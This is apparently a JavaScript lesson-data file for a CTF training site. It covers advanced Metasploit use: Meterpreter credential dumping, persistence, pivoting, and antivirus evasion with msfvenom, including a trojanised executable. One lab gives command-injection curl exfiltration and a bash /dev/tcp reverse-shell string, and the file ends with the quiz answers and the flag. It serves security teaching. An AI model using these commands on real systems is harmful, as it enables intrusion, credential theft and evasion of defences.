/* ================================================
   CTF ARENA — Metasploit Deep Dive Lab Data
   (Advanced Concepts Only)
   ================================================ */

const LESSONS = [
  //  LESSON 1: METERPRETER ADVANCED COMMANDS
  {
    title: "Meterpreter — Advanced Post-Exploitation",
    points: 50,
    icon: "../../../assets/metasploit_intro_nologo_1779434453492.png",
    practical: false,
    content: `METERPRETER — THE HACKER'S SWISS ARMY KNIFE

THE INVISIBLE SPY INSIDE THE CASTLE
Imagine you have already picked the lock and snuck inside a giant castle. You are standing in the entrance hall, but you haven't done anything useful yet. You need to explore every room, steal the crown jewels, plant hidden microphones, and create secret tunnels so you can come back later even if they change the locks! Meterpreter is exactly like an invisible spy that lives inside the castle's walls. Once you successfully exploit a target and get a Meterpreter session, you have a silent, in-memory agent running on the victim's computer. It never touches the hard drive, so antivirus tools have a much harder time finding it. From this session, you can do almost anything on the target machine.

CORE POST-EXPLOITATION COMMANDS:

Process Management:
  • getpid          — Shows the Process ID of the process Meterpreter is living inside.
  • ps              — Lists ALL running processes on the target machine.
  • migrate <PID>   — Moves Meterpreter into a different process. This is critical for stability. If a user closes the application you exploited, your session dies unless you migrate to a more stable process (like explorer.exe or svchost.exe).

Privilege Escalation:
  • getuid           — Shows your current user identity on the target.
  • getsystem        — Attempts to escalate your privileges to SYSTEM (the highest privilege on Windows), using multiple techniques including named pipe impersonation and token duplication.
  • getprivs         — Lists all Windows privileges available to your current process token.

Credential Harvesting:
  • hashdump         — Dumps the SAM (Security Account Manager) database, extracting NTLM password hashes for every local user account. Requires SYSTEM privileges.
  • load kiwi        — Loads the Mimikatz extension (called "Kiwi" in Meterpreter). Mimikatz is the most famous credential extraction tool in cybersecurity.
  • creds_all        — After loading Kiwi, this dumps ALL cached credentials including plaintext passwords, Kerberos tickets, and NTLM hashes from memory.

File System Operations:
  • download <file>  — Downloads a file from the target to your attacker machine.
  • upload <file>    — Uploads a file from your attacker machine to the target.
  • search -f *.docx — Searches the entire target file system for specific file types (e.g., all Word documents).
  • cat <file>       — Reads and displays the contents of a file on the target.

Network Reconnaissance:
  • ipconfig / ifconfig — Shows all network interfaces on the target. Critical for discovering additional internal networks for pivoting.
  • arp              — Shows the ARP cache, revealing other machines the target has recently communicated with.
  • route            — Displays the target's routing table, showing what networks the machine can reach.

TASK: Answer the questions below.`,
    questions: [
      { q: "What Meterpreter command moves your session into a different process for stability?", a: "migrate" },
      { q: "What Meterpreter command attempts to escalate privileges to SYSTEM level?", a: "getsystem" },
      { q: "What Meterpreter command extracts NTLM password hashes from the SAM database?", a: "hashdump" },
      { q: "What Meterpreter extension (loaded via 'load' command) provides Mimikatz functionality?", a: "kiwi" },
      { q: "What Meterpreter command shows your current user identity on the target?", a: "getuid" }
    ]
  },

  //  LESSON 2: POST-EXPLOITATION MODULES
  {
    title: "Post-Exploitation Modules & Persistence",
    points: 50,
    icon: "../../../assets/metasploit_basics_nologo_1779673940162.png",
    practical: false,
    content: `POST-EXPLOITATION MODULES — DIGGING DEEPER

THE BURGLAR WHO PLANTS A SECRET BACK DOOR
You've broken into the castle, but what happens tomorrow when they fix the lock? A skilled burglar doesn't just steal things — they install a secret hidden door in the castle wall so they can walk right back in whenever they want, even after the original lock is replaced! In Metasploit, "Post" modules are tools designed to run AFTER you've already compromised a target. And "Persistence" is the art of installing that hidden back door.

POST MODULE CATEGORIES:

Metasploit's post-exploitation modules follow the path:
  post/<platform>/<category>/<name>

Categories include:

1. GATHER — Intelligence Collection:
  • post/windows/gather/enum_logged_on_users
    → Lists all users currently logged into the system and their recent login history.
  • post/windows/gather/enum_applications
    → Lists every installed application and its version. Useful for finding more vulnerable software.
  • post/linux/gather/enum_network
    → Enumerates all network configuration, interfaces, routes, and connections on a Linux target.
  • post/multi/gather/firefox_creds
    → Extracts saved passwords from Firefox browser profiles.

2. ESCALATE — Privilege Escalation:
  • post/multi/recon/local_exploit_suggester
    → Analyses the target system and suggests local privilege escalation exploits that are likely to work. This is one of the MOST useful post modules!
  • post/windows/escalate/getsystem
    → Attempts multiple SYSTEM-level escalation techniques.

3. MANAGE — System Control:
  • post/windows/manage/enable_rdp
    → Remotely enables Remote Desktop Protocol on the target, allowing GUI access.
  • post/windows/manage/killav
    → Attempts to kill (stop) running antivirus processes.
  • post/linux/manage/download_exec
    → Downloads and executes a file on a Linux target.

4. PERSISTENCE — Maintaining Access:

  • Persistence via Registry Run Keys:
    post/windows/manage/persistence_exe
    → Uploads an executable and creates a registry key that runs it automatically every time the user logs in.

  • Persistence via Scheduled Tasks:
    exploit/windows/local/persistence_service
    → Creates a new Windows service that starts automatically on boot, reconnecting to the attacker.

  • Persistence via Cron Jobs (Linux):
    post/linux/manage/sshkey_persistence
    → Injects your SSH public key into the target's authorized_keys file, granting passwordless SSH access forever.

USING POST MODULES:
  1. Background your Meterpreter session: background
  2. Select the post module: use post/windows/gather/enum_logged_on_users
  3. Set the session number: set SESSION 1
  4. Run it: run

TASK: Answer the questions below.`,
    questions: [
      { q: "What post module analyses a target and suggests local privilege escalation exploits?", a: "post/multi/recon/local_exploit_suggester" },
      { q: "What Meterpreter command sends your current session to the background?", a: "background" },
      { q: "What option must you set to tell a post module which Meterpreter session to use?", a: "SESSION" },
      { q: "What post module enables Remote Desktop Protocol (RDP) on a Windows target?", a: "post/windows/manage/enable_rdp" },
      { q: "What post module injects an SSH key for persistent Linux access?", a: "post/linux/manage/sshkey_persistence" }
    ]
  },

  //  LESSON 3: PIVOTING & PORT FORWARDING
  {
    title: "Pivoting & Port Forwarding",
    points: 60,
    icon: "../../../assets/metasploit_commands_nologo_1779673954712.png",
    practical: false,
    content: `PIVOTING — JUMPING THROUGH NETWORKS

THE SECRET TUNNEL BETWEEN CASTLES
Imagine you've broken into Castle A, and from inside Castle A, you can see Castle B across the moat. Castle B has its drawbridge up — it's completely hidden from the outside world and only talks to Castle A through a private underground tunnel. From outside, you can NEVER reach Castle B directly. But because you're now inside Castle A, you can use Castle A's private tunnel to sneak into Castle B! This is called "Pivoting" — using a compromised machine as a stepping stone to reach networks and systems that are otherwise invisible and inaccessible from your attacker machine.

WHY PIVOTING MATTERS:
In real corporate networks, the valuable targets (databases, domain controllers, file servers) are almost NEVER directly accessible from the internet. They sit on internal networks behind firewalls. The only way to reach them is through an already-compromised machine that has a foot in both networks.

TECHNIQUE 1 — AUTOROUTE:

Once you have a Meterpreter session on a dual-homed host (a machine connected to two networks), you can add a route through that session:

  meterpreter > run autoroute -s 10.10.10.0/24

This tells Metasploit: "To reach any IP in the 10.10.10.0/24 network, send all traffic through this Meterpreter session."

After adding the route, you can use Metasploit modules (scanners, exploits) against hosts on 10.10.10.0/24, and the traffic is transparently tunneled through the compromised machine.

To verify routes:
  meterpreter > run autoroute -p

TECHNIQUE 2 — PORT FORWARDING (portfwd):

Port forwarding creates a direct tunnel from your attacker machine to a specific port on an internal target:

  meterpreter > portfwd add -l 4444 -p 3389 -r 10.10.10.20

Breaking this down:
  • -l 4444   — Listen on port 4444 on YOUR machine
  • -p 3389   — Forward to port 3389 (RDP) on the internal target
  • -r 10.10.10.20  — The internal target IP

Now, connecting to localhost:4444 on your attacker machine tunnels directly to 10.10.10.20:3389 through the compromised host.

To list active port forwards:
  meterpreter > portfwd list

To delete a forward:
  meterpreter > portfwd delete -l 4444

TECHNIQUE 3 — SOCKS PROXY:

For more flexible pivoting, you can set up a SOCKS4a proxy through Metasploit:

  msf6 > use auxiliary/server/socks_proxy
  msf6 > set SRVPORT 1080
  msf6 > run -j

Then configure proxychains on your attacker machine to route ANY tool (nmap, curl, firefox) through the compromised host:
  proxychains nmap -sT 10.10.10.0/24

TASK: Answer the questions below.`,
    questions: [
      { q: "What Meterpreter command adds a route to an internal network through a compromised session?", a: "autoroute" },
      { q: "What Meterpreter command creates a tunnel from a local port to a remote port through the victim?", a: "portfwd" },
      { q: "In the command 'portfwd add -l 4444 -p 3389 -r 10.10.10.20', what does the -l flag specify?", a: "local port" },
      { q: "What auxiliary module creates a SOCKS proxy for flexible pivoting?", a: "auxiliary/server/socks_proxy" },
      { q: "What Linux tool routes arbitrary commands through a SOCKS proxy? (one word)", a: "proxychains" },
      { q: "What type of host has connections to two separate networks, making it ideal for pivoting? (two words)", a: "dual-homed" }
    ]
  },

  //  LESSON 4: EVASION TECHNIQUES
  {
    title: "Evasion — Encoders, Packers & AV Bypass",
    points: 60,
    icon: "../../../assets/metasploit_terminal_nologo_1779673970904.png",
    practical: false,
    content: `EVASION TECHNIQUES — BECOMING INVISIBLE

THE DISGUISE MASTER
Imagine you're trying to sneak a birthday present past your little brother, but he's watching every door in the house. If he sees a box wrapped in birthday paper, he'll immediately grab it! So, what do you do? You disguise the present! You wrap it in a plain brown shopping bag, then put that inside a sports bag, then carry it in a backpack. Your brother looks at you carrying a backpack and thinks, "Boring, nothing to see here." In cybersecurity, this is exactly what Evasion Techniques do — they disguise malicious payloads so antivirus software and security tools can't recognize them.

1. ENCODERS — SCRAMBLING THE PAYLOAD:

Encoders transform the payload's binary code into a different format to avoid signature-based detection. Think of it as translating your secret message into a language the guards don't understand.

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

Breaking this down:
  • -p                 — The payload to generate
  • -e x86/shikata_ga_nai — The encoder. Shikata Ga Nai is the most famous polymorphic encoder. It generates a different encoded output every time!
  • -i 10              — Iterate (re-encode) 10 times for deeper obfuscation
  • -f exe             — Output format (executable)
  • -o payload.exe     — Output filename

Listing all available encoders:
  msfvenom --list encoders

Common encoders ranked by effectiveness:
  • x86/shikata_ga_nai  — Excellent (polymorphic XOR feedback encoder)
  • x86/call4_dword_xor — Normal
  • cmd/powershell_base64 — For PowerShell payloads

2. MSFVENOM OUTPUT FORMATS:

msfvenom can generate payloads in many formats beyond simple executables:
  • exe     — Windows executable
  • elf     — Linux executable
  • raw     — Raw shellcode bytes
  • python  — Python-formatted shellcode for injection
  • ps1     — PowerShell script
  • asp     — ASP web shell
  • war     — Java WAR file for deployment to Tomcat
  • dll     — Windows Dynamic Link Library
  • vba     — Visual Basic for Applications (macro-based attacks)

List all formats: msfvenom --list formats

3. EVASION MODULES:

Metasploit 5+ introduced dedicated evasion modules:
  msf6 > use evasion/windows/windows_defender_exe
  msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
  msf6 > set LHOST 10.10.10.5
  msf6 > generate

These modules specifically craft payloads to bypass named security products.

4. CUSTOM TEMPLATES:

You can embed a payload inside a legitimate executable:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -x /path/to/legitimate.exe -k -f exe -o trojan.exe

  • -x — Use this legitimate program as a template
  • -k — Keep the original program functional (it runs normally AND executes the payload)

TASK: Answer the questions below.`,
    questions: [
      { q: "What is the name of Metasploit's most famous polymorphic XOR feedback encoder?", a: "shikata_ga_nai" },
      { q: "What msfvenom flag specifies the encoder to use?", a: "-e" },
      { q: "What msfvenom flag specifies how many times to re-encode the payload?", a: "-i" },
      { q: "What msfvenom command lists all available output formats?", a: "msfvenom --list formats" },
      { q: "What msfvenom flag embeds the payload inside a legitimate executable template?", a: "-x" },
      { q: "What msfvenom flag keeps the template executable functional while adding the payload?", a: "-k" }
    ]
  },

  //  LESSON 5: RESOURCE SCRIPTS & HANDLER AUTOMATION
  {
    title: "Resource Scripts & Handler Automation",
    points: 50,
    icon: "../../../assets/metasploit_challenge_nologo_1779673986381.png",
    practical: false,
    content: `RESOURCE SCRIPTS — AUTOMATING METASPLOIT

THE ROBOT BUTLER WITH A PERFECT MEMORY
Imagine you had a robot butler who could memorize a perfect sequence of 100 actions: unlock the door, turn on the lights, start the coffee machine, open the curtains, put the newspaper on the table — all without you saying a single word. Every morning, you just press one button and the robot does everything perfectly, in order, every time! Metasploit Resource Scripts work exactly like this robot butler. They are simple text files that contain a list of Metasploit commands, and when you load the script, Metasploit executes every command automatically, one after another.

WHY USE RESOURCE SCRIPTS?

In real penetration testing engagements:
  • Setting up a multi/handler listener requires 5+ commands every single time.
  • Scanning a target network follows the same pattern repeatedly.
  • Reproducibility is essential — you need to prove exactly what steps you took.
  • Speed matters — a script runs in seconds; typing commands takes minutes.

CREATING A RESOURCE SCRIPT:

A resource script is just a plain .rc text file containing Metasploit commands, one per line.

Example — auto_handler.rc:
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  set ExitOnSession false
  exploit -j

This script:
  1. Selects the multi/handler exploit (a listener)
  2. Configures it for a reverse Meterpreter connection
  3. Listens on all interfaces (0.0.0.0) on port 4444
  4. Keeps listening even after getting a session (ExitOnSession false)
  5. Runs the listener as a background job (-j)

RUNNING RESOURCE SCRIPTS:

Method 1 — From inside msfconsole:
  msf6 > resource /path/to/auto_handler.rc

Method 2 — From the command line (when launching msfconsole):
  msfconsole -r /path/to/auto_handler.rc

Method 3 — Record your actions into a script:
  msf6 > makerc /path/to/my_recording.rc
  This saves everything you've typed in your current session into a .rc file. Perfect for creating reusable scripts from manual exploration!

THE MULTI/HANDLER — ADVANCED USAGE:

The multi/handler is the universal listener in Metasploit. It's what catches incoming connections from payloads you've deployed:

  • ExitOnSession: Set to false to keep the handler running and catch multiple callbacks.
  • AutoRunScript: Automatically runs a script on every new session.
    set AutoRunScript post/windows/manage/migrate

  • Running Multiple Handlers:
    Use exploit -j to run handlers as background jobs, then start new handlers on different ports for different payloads.

  • Listing active jobs: jobs -l
  • Killing a job: jobs -k <job-id>
  • Listing sessions: sessions -l
  • Interacting with a session: sessions -i <session-id>

GLOBAL DATASTORE:

Use setg to set global variables that persist across all modules:
  msf6 > setg RHOSTS 10.10.10.0/24
  msf6 > setg LHOST 10.10.10.5

This saves you from re-typing the same values every time you switch modules.

TASK: Answer the questions below.`,
    questions: [
      { q: "What file extension do Metasploit resource scripts use?", a: ".rc" },
      { q: "What msfconsole command loads and executes a resource script?", a: "resource" },
      { q: "What msfconsole command records your current session's commands into a resource script?", a: "makerc" },
      { q: "What option keeps the multi/handler listening after receiving a session?", a: "ExitOnSession" },
      { q: "What command sets a global variable that persists across all modules?", a: "setg" }
    ]
  },

  //  LESSON 6: PRACTICAL CHALLENGE (DOCKER PANELS SHOWN HERE)
  {
    title: "Practical — Advanced Exploitation Chain",
    points: 60,
    icon: "../../../assets/metasploit_intro_nologo_1779434453492.png",
    practical: true,
    content: `PRACTICAL CHALLENGE — ADVANCED EXPLOITATION CHAIN

In this practical lesson, you will exploit a vulnerable 
web API using advanced techniques: reconnaissance, 
command injection chaining, and data exfiltration.


    YOUR MISSION: Use command chaining to perform 
      multi-stage exploitation and capture the flag.


SCENARIO OVERVIEW:

The target is the "SecureCorp API Portal" — a diagnostics 
server with an OS Command Injection vulnerability at:
  /api/diagnostics?cmd=<command>

But this time, you won't just grab a flag file. You'll 
perform a realistic attack chain: enumerate the system, 
discover secrets, and exfiltrate data.


STEP-BY-STEP WALKTHROUGH:


STEP 1 — Launch Both Containers
  
    ① Click "Launch Target Server" above.        
    ② Click "Start Kali Container" above.        
    ③ Note the TARGET IP (e.g. 172.17.0.2)       
    ④ Note the Kali docker exec command shown.   
  

STEP 2 — Connect to Your Kali Container
  
    Open a terminal on your HOST machine and     
    paste the command shown in the Kali panel:   
                                                 
    $ docker exec -it <container-id> bash        
                                                 
    You are now inside Kali Linux!               
  

STEP 3 — Reconnaissance: Enumerate the Target
  
    First, discover what's on the server:        
                                                 
    $ curl http://<TARGET_IP>/                   
                                                 
    Note the API endpoint hint, then:            
                                                 
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=id"
                                                 
    This reveals which USER the server runs as!  
    Next, check what operating system:           
                                                 
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=uname%20-a"
                                                 
    %20 = space (URL-encoded)                    
  

STEP 4 — Enumerate Files & Secrets
  
    List the root directory to find secrets:     
                                                 
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ls%20/"
                                                 
    You'll see directories like /etc, /tmp, etc. 
    Look for unusual files:                      
                                                 
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ls%20/etc/"
                                                 
    The flag file is hidden somewhere in /etc.   
  

STEP 5 — Exfiltrate the Flag!
  
    Use command chaining (semicolon = %3B) to    
    run multiple commands:                       
                                                 
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=id%3Bcat%20/etc/flag"
                                                 
      BREAKDOWN:                                 
      • id          = show current user (recon)  
      • %3B         = ; (chain a 2nd command)    
      • cat%20      = cat (space = %20)          
      • /etc/flag   = the flag file              
                                                 
     The server returns the FLAG in JSON!      
  

ALTERNATIVE — Using Pipe (|) for chaining:
  
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=id%7Ccat%20/etc/flag"
                                                 
    %7C = pipe (|) character — also works!       
  


ADVANCED TECHNIQUE — Reverse Shell Concept:

In a real engagement, after confirming command injection, 
you would establish a reverse shell for interactive access:

  On your Kali machine (listener):
    $ nc -lvnp 9999

  Via the injection point:
    cmd=id%3Bbash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/9999%200>%261'

This gives you a full interactive shell on the target!
(Note: This is a concept explanation — the lab flag uses 
the simpler curl method above.)`,
    questions: [
      { q: "What command did you use to identify the user the server runs as? (one word)", a: "id" },
      { q: "What is the URL-encoded representation of a semicolon? (e.g. %XX)", a: "%3B" },
      { q: "What is the vulnerable API endpoint path on the target server?", a: "/api/diagnostics" }
    ]
  },

  //  LESSON 7: FLAG SUBMISSION
  {
    title: " Capture the Flag",
    points: 30,
    icon: "../../../assets/metasploit_basics_nologo_1779673940162.png",
    practical: false,
    content: ` FLAG SUBMISSION


        SUBMIT YOUR CAPTURED FLAG BELOW


If you successfully ran the exploitation chain from 
the previous lesson, the server returned a JSON 
response containing the flag.

  You MUST run the actual exploit to get the flag!
    The flag is hidden inside the target container.
    There is no shortcut — execute the curl command
    from Lesson 6 to reveal it.

The response will look something like this:

  {                                              
    "status": "success",                         
    "output": "Simulated RCE Triggered:          
               FLAG{?????_????_????_??????}",     
    "debug_info": "Warning: Command              
     sanitization failed. Unauthorized           
     command context executed."                   
  }                                              


Copy the FLAG{...} value from YOUR terminal output 
and paste it into the answer box below.

HINT: If you forgot the exploit command, go back 
to Lesson 6, Step 5 and run:
  curl "http://<TARGET_IP>/api/diagnostics?cmd=id%3Bcat%20/etc/flag"


QUICK REFERENCE — Advanced Concepts Covered:

  ① Meterpreter Post-Exploitation — migrate, 
     getsystem, hashdump, load kiwi, creds_all
  ② Post Modules — local_exploit_suggester, 
     persistence, gather modules
  ③ Pivoting — autoroute, portfwd, SOCKS proxy, 
     proxychains for multi-network attacks
  ④ Evasion — shikata_ga_nai encoder, msfvenom 
     output formats, custom templates (-x, -k)
  ⑤ Automation — Resource scripts (.rc), makerc, 
     multi/handler, setg, background jobs
  ⑥ Practical Exploitation — Recon enumeration, 
     command chaining, data exfiltration

CONGRATULATIONS ON MASTERING ADVANCED METASPLOIT! `,
    questions: [
      { q: "Submit the flag you captured from the vulnerable target:", a: "FLAG{MSF_D33P_D1V3_M4ST3R}" }
    ]
  }
];
